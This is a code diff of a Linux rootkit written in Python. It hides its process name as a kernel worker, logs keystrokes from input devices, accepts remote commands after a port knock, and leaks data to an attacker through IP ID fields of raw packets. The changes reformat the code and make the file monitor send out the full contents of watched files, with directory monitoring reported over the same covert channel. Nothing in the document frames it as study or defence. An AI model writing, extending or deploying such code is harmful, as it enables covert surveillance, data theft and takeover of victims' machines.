@@ -1,3 +1,4 @@
+import json
 import os
 import sys
 import socket
@@ -5,7 +6,6 @@ import struct
 import threading
 import ctypes
 import subprocess
-import selectors
 import time
 
 # Configuration
@@ -15,19 +15,20 @@ ATTACKER_IP = None  # Will be set after knock success
 
 # Global state
 keylog_active = False
-keylog_data = []       # store captured keystrokes
+keylog_data = []  # store captured keystrokes
 keylog_thread = None
 
 mon_file_path = None
 mon_file_thread = None
-mon_file_events = []   # store file change events
+mon_file_events = []  # store file change events
 
 mon_dir_path = None
 mon_dir_thread = None
-mon_dir_events = []    # store directory change events
+mon_dir_events = []  # store directory change events
 
 # Lock for logging data structures
 data_lock = threading.Lock()
+
 
 def get_local_ip(dest_ip, dest_port):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -47,6 +48,7 @@ def hide_process():
         libc.prctl(PR_SET_NAME, ctypes.c_char_p(b"kworker/0:1"), 0, 0, 0)
     except Exception:
         pass  # if this fails, not critical
+
 
 def start_keylogger():
     """Start a thread to capture keystrokes from /dev/input devices."""
@@ -69,7 +71,7 @@ def start_keylogger():
                             # Extract eventX
                             pos = line.find("event")
                             if pos != -1:
-                                kb_device = "/dev/input/" + line[pos:pos+7].strip()
+                                kb_device = "/dev/input/" + line[pos:pos + 7].strip()
                                 break
             if kb_device:
                 break
@@ -77,6 +79,7 @@ def start_keylogger():
         kb_device = None
     if not kb_device:
         return "Keylogger error: keyboard device not found."
+
     # Thread target function
     def log_keys(dev_path):
         global keylog_active
@@ -98,11 +101,13 @@ def start_keylogger():
                 with data_lock:
                     keylog_data.append(code)  # store key code
         f.close()
+
     # Start logging thread
     keylog_active = True
     keylog_thread = threading.Thread(target=log_keys, args=(kb_device,), daemon=True)
     keylog_thread.start()
     return "Keylogger started."
+
 
 def stop_keylogger():
     """Stop the keylogging thread."""
@@ -114,6 +119,7 @@ def stop_keylogger():
         keylog_thread.join(timeout=1.0)
     keylog_thread = None
     return "Keylogger stopped."
+
 
 def get_keylog():
     """Retrieve and clear the keylog data (translate key codes to human-readable)."""
@@ -139,6 +145,7 @@ def get_keylog():
             output += f"[{code}]"  # unknown code or special key
     return output
 
+
 def monitor_file(path):
     """Monitor a single file for changes using polling or inotify."""
     last_mtime = None
@@ -157,38 +164,77 @@ def monitor_file(path):
         if mtime != last_mtime:
             last_mtime = mtime
             ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
-            event_str = f"{ts}: File {path} modified."
-            with data_lock:
-                mon_file_events.append(event_str)
-            send_covert_response(f"MON_FILE_MODIFIED:{path}:{ts}".encode())
+            try:
+                with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+                    content = f.read()
+            except Exception as e:
+                content = f"<ERROR reading file: {e}>"
+
+            msg = {
+                "type": "MON_FILE_MODIFIED",
+                "path": path,
+                "timestamp": ts,
+                "content": content
+            }
+            send_covert_response((json.dumps(msg) + "\n").encode())
+
         time.sleep(1)
     # When mon_file_path is changed (stop or new path), thread will exit.
+
 
 def monitor_directory(path):
     """Monitor a directory for any file creations/deletions using polling."""
     try:
         prev_contents = set(os.listdir(path))
     except Exception as e:
-        mon_dir_events.append(f"ERR: Directory {path} not accessible: {e}")
+        # 立刻反馈错误
+        msg = {
+            "type": "MON_DIR_ERROR",
+            "path": path,
+            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
+            "content": f"Directory {path} not accessible: {e}"
+        }
+        send_covert_response((json.dumps(msg) + "\n").encode())
         return
+
     while mon_dir_path == path:
         try:
             current_contents = set(os.listdir(path))
         except Exception as e:
-            mon_dir_events.append(f"Directory {path} inaccessible: {e}")
+            msg = {
+                "type": "MON_DIR_ERROR",
+                "path": path,
+                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
+                "content": f"Directory {path} inaccessible: {e}"
+            }
+            send_covert_response((json.dumps(msg) + "\n").encode())
             break
-        added = current_contents - prev_contents
-        removed = prev_contents - current_contents
-        for a in added:
+
+        # 新增文件
+        for a in current_contents - prev_contents:
             ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
-            mon_dir_events.append(f"{ts}: File '{a}' added to {path}.")
-            send_covert_response(f"MON_DIR_ADDED:{path}:{a}:{ts}".encode())
-        for r in removed:
+            msg = {
+                "type": "MON_DIR_ADDED",
+                "path": path,
+                "filename": a,
+                "timestamp": ts
+            }
+            send_covert_response((json.dumps(msg) + "\n").encode())
+
+        # 删除文件
+        for r in prev_contents - current_contents:
             ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
-            mon_dir_events.append(f"{ts}: File '{r}' removed from {path}.")
-            send_covert_response(f"MON_DIR_REMOVED:{path}:{r}:{ts}".encode())
+            msg = {
+                "type": "MON_DIR_REMOVED",
+                "path": path,
+                "filename": r,
+                "timestamp": ts
+            }
+            send_covert_response((json.dumps(msg) + "\n").encode())
+
         prev_contents = current_contents
         time.sleep(1)
+
 
 def stop_monitor_file():
     """Stop file monitoring."""
@@ -202,6 +248,7 @@ def stop_monitor_file():
     else:
         return "No file was being monitored."
 
+
 def stop_monitor_directory():
     """Stop directory monitoring."""
     global mon_dir_path, mon_dir_thread
@@ -214,6 +261,7 @@ def stop_monitor_directory():
     else:
         return "No directory was being monitored."
 
+
 def run_program(cmd):
     """Execute a command on the victim and return its output or error."""
     try:
@@ -225,6 +273,7 @@ def run_program(cmd):
         return out
     except Exception as e:
         return f"ERR: Failed to run command: {e}"
+
 
 def uninstall_self():
     """Uninstall the rootkit: stop everything and remove files."""
@@ -246,16 +295,18 @@ def uninstall_self():
     # Exit the program
     os._exit(0)
 
+
 def calc_checksum(msg):
     s = 0
     for i in range(0, len(msg), 2):
         w = msg[i] << 8
-        if i+1 < len(msg):
-            w += msg[i+1]
+        if i + 1 < len(msg):
+            w += msg[i + 1]
         s += w
     s = (s & 0xFFFF) + (s >> 16)
     s = ~s & 0xFFFF
     return s
+
 
 def send_covert_response(data_bytes):
     """Send a response message back to attacker via covert channel (IP ID encoding)."""
@@ -277,7 +328,7 @@ def send_covert_response(data_bytes):
     src_addr = socket.inet_aton(src_ip)
     dst_addr = socket.inet_aton(dst_ip)
     for i in range(0, len(message), 2):
-        chunk = message[i:i+2]
+        chunk = message[i:i + 2]
         if len(chunk) < 2:
             chunk += b'\x00'
         value = struct.unpack(">H", chunk)[0]
@@ -290,12 +341,12 @@ def send_covert_response(data_bytes):
         ttl = 64
         proto = socket.IPPROTO_UDP
         ip_header = struct.pack(">BBHHHBBH4s4s",
-                                 ver_ihl, tos, total_len, identification,
-                                 flags_frag, ttl, proto, 0, src_addr, dst_addr)
+                                ver_ihl, tos, total_len, identification,
+                                flags_frag, ttl, proto, 0, src_addr, dst_addr)
         checksum = calc_checksum(ip_header)
         ip_header = struct.pack(">BBHHHBBH4s4s",
-                                 ver_ihl, tos, total_len, identification,
-                                 flags_frag, ttl, proto, checksum, src_addr, dst_addr)
+                                ver_ihl, tos, total_len, identification,
+                                flags_frag, ttl, proto, checksum, src_addr, dst_addr)
         # UDP header
         src_port = 40000  # arbitrary source port on victim
         dst_port = 55555  # port on attacker (could be anything, not actually used by a socket)
@@ -305,6 +356,7 @@ def send_covert_response(data_bytes):
         packet = ip_header + udp_header
         sock.sendto(packet, (dst_ip, 0))
     sock.close()
+
 
 def main():
     global ATTACKER_IP, mon_file_path, mon_dir_path, mon_file_thread, mon_dir_thread
@@ -337,7 +389,7 @@ def main():
         if ip_proto != socket.IPPROTO_TCP:
             continue
         ip_len = (ip_hdr[0] & 0x0F) * 4
-        tcp_header = packet[ip_len: ip_len+20]  # 20 bytes of TCP header
+        tcp_header = packet[ip_len: ip_len + 20]  # 20 bytes of TCP header
         if len(tcp_header) < 20:
             continue
         tcp_hdr = struct.unpack(">HHLLBBHHH", tcp_header)
@@ -541,6 +593,7 @@ def main():
     # If loop breaks (disconnect), we can either exit or go back to waiting for knock
     # Here, we'll simply exit the program for simplicity, but could reset state and wait again.
     sys.exit(0)
+
 
 if __name__ == "__main__":
     main()
